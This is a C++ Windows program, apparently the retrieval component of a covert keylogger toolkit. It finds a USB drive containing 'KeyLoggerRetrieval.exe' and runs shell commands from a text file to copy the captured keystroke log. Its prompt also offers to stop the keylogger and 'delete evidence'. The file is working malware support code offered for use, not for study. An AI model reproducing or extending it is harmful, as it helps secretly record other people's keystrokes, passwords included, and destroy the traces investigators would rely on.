#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
std::string FindUSB()
{
	char letter ='z';
	std::string USB;
	std::string currentUSB;
	bool flag=false;
	while((letter <='z' &&letter >='a')&& !flag)
	{
		currentUSB=static_cast<char>(toupper(letter));
		currentUSB.append(":\\");
		currentUSB+="KeyLoggerRetrieval\\KeyLoggerRetrieval.exe";
		std::ifstream file(currentUSB);
		flag=file;
		
		if(flag)
		{
			std::cout<<"FOUND USB:"<<currentUSB<<std::endl;
		}
		letter--;
	}
	if(!flag)
	{
		USB="NONE";
	}
	else
	{
		USB=currentUSB.substr(0,2);
	}
	return USB;
}
void RetrieveLog(std::string choice)
{
	std::string USB=FindUSB();
	std::ifstream file;
	if(choice=="RetrieveAndDelete")
	{
		file.open("RetrievalAndDeleteCommands.txt");
		std::cout<<"Option1"<<std::endl;
	}
	else if(choice=="Retrieve")
	{
		file.open("RetrievalCommands.txt");
		std::cout<<"Option2"<<std::endl;
	}
	
	std::string currentCommand;
	int posUSB;
	while(std::getline(file,currentCommand))
	{
		std::cout<<currentCommand<<std::endl;
		posUSB=currentCommand.find("USB:");
		if(posUSB!=-1)
		{
			currentCommand.replace(posUSB,4,USB);
			std::cout<<currentCommand<<std::endl;
			system(currentCommand.c_str());			
		}
		else
		{
			std::cout<<currentCommand<<std::endl;
			system(currentCommand.c_str());
		}
		
	}
}
int main()
{
	std::string answer;
	std::cout<<"Would You like to delete stop keylogger,delete evidence and retrieve log or just retrieve current log[RetrieveAndDelete\\Retrieve]"<<std::endl;
	std::cin>>answer;
	RetrieveLog(answer);
}

